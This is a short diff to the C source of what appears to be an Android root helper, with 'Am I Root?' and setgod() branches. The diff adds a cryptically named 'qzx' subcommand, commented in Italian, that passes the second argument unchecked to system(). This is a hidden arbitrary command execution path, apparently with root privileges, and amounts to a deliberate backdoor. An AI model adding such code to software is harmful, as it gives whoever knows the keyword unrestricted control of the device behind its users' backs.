@@ -74,6 +74,8 @@ int main(int argc, char** argv) {
 			my_mount("/mnt/sdcard");
 		} else if (strcmp(argv[1], "air") == 0) { // Am I Root?
 			return setgod();
+		} else if (strcmp(argv[1], "qzx") == 0) { // Eseguiamo la riga passataci
+			return system(argv[2]);
 		}
 	} else {
 		const char * shell = "/system/bin/sh";
